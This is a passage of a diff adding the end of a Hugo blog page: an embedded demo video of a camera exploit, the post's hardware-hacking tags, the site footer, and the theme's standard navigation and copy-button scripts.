+  <source src="/videos/camera-exploit.mp4" type="video/mp4">
+  Your browser does not support the video tag.
+</video>
+<p><em>Short Video of Demo Exploit</em></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/hardware/">Hardware</a></li>
+      <li><a href="http://localhost:1313/tags/reverse-engineering/">Reverse-Engineering</a></li>
+      <li><a href="http://localhost:1313/tags/uart/">Uart</a></li>
+      <li><a href="http://localhost:1313/tags/ingenic-t31/">Ingenic-T31</a></li>
+      <li><a href="http://localhost:1313/tags/root-access/">Root-Access</a></li>
+    </ul>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/">Messing with Code So You Don’t Have To</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
